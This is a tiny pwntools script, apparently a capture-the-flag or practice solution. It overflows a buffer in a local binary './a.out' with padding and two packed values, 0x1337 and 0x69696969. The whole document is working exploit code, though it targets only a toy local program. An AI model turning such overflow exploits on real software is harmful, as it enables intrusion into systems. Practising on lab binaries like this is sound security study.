from pwn import *
p = process("./a.out")
p.recv()
p.sendline((0x110-0x8)*b'A' + p32(0x1337) + p32(0x69696969))
p.recv()
